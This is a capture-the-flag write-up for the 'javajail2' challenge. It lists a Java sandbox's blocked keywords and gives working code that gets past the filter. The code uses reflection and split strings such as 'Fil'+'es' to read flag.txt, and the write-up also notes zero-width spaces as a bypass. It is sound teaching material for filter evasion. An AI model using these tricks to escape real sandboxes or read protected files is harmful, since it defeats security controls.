---
title: "javajail2"
description: "okay sorry here's a real jail."
points: 355
solves: 54
author: Jozef Steinhübl
date: April 10 2024
---

## Introduction

![task](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-jail-javajail2.png)

In this jail, we can't use `import`, `throws`, `new`, `File`, `Scanner`, `Buffered`, `Process`, `Runtime`, `ScriptEngine`, `Print`, `Stream`, `Field`, `javax`, `flag.txt`, `^`, `|`, `&`, `'`, `\\`, `[]`, `:` but we can use strings and curly braces. That means we're gonna write a normal program instead of using some weird compiler behaviour.

## Solution

The easiest way to read a file in modern Java versions is probably by using `java.nio.file.Files` and `java.nio.file.Paths`.

```java
interface Lmao { // using interface because why not :-D
    public static void main(String... args) {
      try {
        var path = java.nio.file.Paths.get("flag.txt");
        var content = java.nio.file.Files.readString(path);

        System.out.println(content);
      } catch (java.lang.Exception e) {
        e.printStackTrace();
      }
    }
}
```

but wait! We can't have any word that contains `File` and `flag.txt`. That means we can't use `java.nio.file.Files`, or can we...? We can, by using our most beloved, reflections! For the `flag.txt` we can just do something like `"fla" + "g.txt"`

```java
interface Lmao {
  public static void main(String... args) {
    try {
      var path = java.nio.file.Paths.get("fla" + "g.txt");

      var fsClass = Class.forName("java.nio.file." + "Fil" + "es");
      var readStringMethod = fsClass.getMethod("readString", Class.forName("java.nio.file.Path"));
      var content = readStringMethod.invoke(null, path);

      System.out.println(content);
    } catch (java.lang.Exception e) {
      e.printStackTrace();
    }
  }
}
```

We can minify this code into one line by the easiest method - putting the code into the browser's search bar and copying the minified code.

```java
interface Lmao { public static void main(String... args) { try { var path = java.nio.file.Paths.get("fla" + "g.txt"); var fsClass = Class.forName("java.nio.file." + "Fil" + "es"); var readStringMethod = fsClass.getMethod("readString", Class.forName("java.nio.file.Path")); var content = readStringMethod.invoke(null, path); System.out.println(content); } catch (java.lang.Exception e) { e.printStackTrace(); } } }
```

And now we can just paste this code into the jail's socket using netcat and it will print the flag.

```
amateursCTF{r3flect3d_4cr055_all_th3_fac35}
```

> **FunFact**  
> Java compiler is a beautiful thing. You can just use [ZWSP](https://en.wikipedia.org/wiki/Zero-width_space) characters to bypass the filter.